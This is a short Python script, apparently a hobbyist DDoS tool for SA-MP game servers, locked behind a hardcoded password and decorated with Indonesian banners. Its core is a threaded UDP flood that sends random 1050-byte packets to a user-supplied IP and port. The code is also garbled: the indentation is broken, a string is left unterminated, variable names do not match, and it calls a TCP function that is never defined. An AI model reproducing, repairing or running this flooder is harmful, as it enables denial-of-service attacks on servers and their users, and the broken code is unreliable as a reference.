import random
import socket
import threading
import os, sys
import time

password = input("[•] Account :")
time.sleep(2)
if password=="Addy":
print("[✓] Akun  Berhasil Masuk")
  time.sleep(2)
  os.system("clear")
  print("\033[1;34;40m=>Build By Addy<=")
  time.sleep(1)
print("\033[1;34;40m=>TT Addysad<=")
  time.sleep(1)
  print("\033[1;34;40m=>JANGAN BUAT ABUSE ya sayang<=")
  time.sleep(3)
  os.system("clear")
  print('''\033[1;36;40m
 print("==================================")
 print("DDOS FROM SERVER SAMP, TEAM XXBR
 print("=============MURID XXBR=========")

hoice = str(input("\033[1;31;40mAttack Ke (Udp/Tcp) \033[1;31;40m<===> "))
  ip = str(input("\033[1;31;40mIp Target \033[1;31;40m<===> "))
  port = int(input("\033[1;31;40mPort Target \033[1;31;40m<===> "))
  times = int(input("\033[1;31;40mKirim Packets \033[1;31;40m<===> "))
  threads = int(input("\033[1;31;40mKirim Threads \033[1;31;40m<===> "))
  def Addy():
  	data = random._urandom(1050)
  	while True:
  		try:
       try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;36;40m[•]Attack Addy & XXBR For Ip %s Port %s"%(ip,port))
  		except:
  			print("\033[1;31;40m× Warning!")
 for y in range(threads):
  	if choice == 'Udp':
  		th = threading.Thread(target = addy)
  		th.start()
  	elif choice == 'Tcp':
  		th = threading.Thread(target = addy2)
  		th.start()
  		th.start()
else:
  print("\033[1;31;40m[!] Wrong Password!")

